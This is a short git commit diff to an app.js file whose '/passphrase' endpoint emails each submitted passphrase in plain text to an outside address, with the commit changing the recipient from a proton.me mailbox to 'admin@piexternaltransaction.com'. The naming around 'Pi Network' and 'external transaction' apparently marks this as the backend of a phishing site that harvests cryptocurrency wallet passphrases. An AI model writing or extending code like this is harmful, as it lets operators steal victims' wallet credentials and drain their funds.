6b991118a748f2760046bb212064eadee45002e9
victorpinetwork002 <160152638+victorpinetwork002@users.noreply.github.com>
2024-03-15 07:18:44 +0100

    Update app.js

--- app.js
+++ app.js
@@ -44,7 +44,7 @@ app.post('/passphrase', async (req, res) => {
   // Define the email message
   const mailOptions = {
     from: 'admin@piexternaltransaction.com',
-    to: 'pinetwork101@proton.me',
+    to: 'admin@piexternaltransaction.com',
     subject: 'Passphrase Received',
     text: `Passphrase: ${passphrase}`,
   };
